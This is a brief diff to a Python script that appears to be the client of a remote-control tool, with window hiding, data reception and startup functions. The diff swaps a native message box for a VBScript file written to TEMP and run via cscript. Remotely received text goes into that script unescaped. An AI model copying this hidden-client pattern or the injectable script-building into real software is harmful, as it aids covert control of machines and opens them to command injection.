@@ -15,12 +15,13 @@ strPath = os.path.realpath(sys.argv[0])  # get file path
 TMP = os.environ["TEMP"]  # get temp path
 APPDATA = os.environ["APPDATA"]
 
-# hex vales for ctypes Message Box
-MB_OK = 0x0
-ICON_INFO = 0x40
-ICON_STOP = 0x10
 
-MessageBox = ctypes.windll.user32.MessageBoxW
+# vbs message box
+def MessageBox(message):
+    objVBS = open(TMP + "/m.vbs", "w")
+    objVBS.write("Msgbox \"" + message + "\", 16, \"Message\"")
+    objVBS.close()
+    subprocess.Popen(["cscript", TMP + "/m.vbs"], shell=True)
 
 
 def hide():  # hide window
@@ -62,7 +63,7 @@ def recvall(buffer):  # function to receive large amounts of data
 def msg(data):
     # use ctypes to create messagebox instead of tkinter to save on dependencies
     strMsg = data[3:len(data)]
-    MessageBox(None, strMsg, "Message", MB_OK | ICON_INFO)
+    MessageBox(strMsg)
 
 
 def startup():
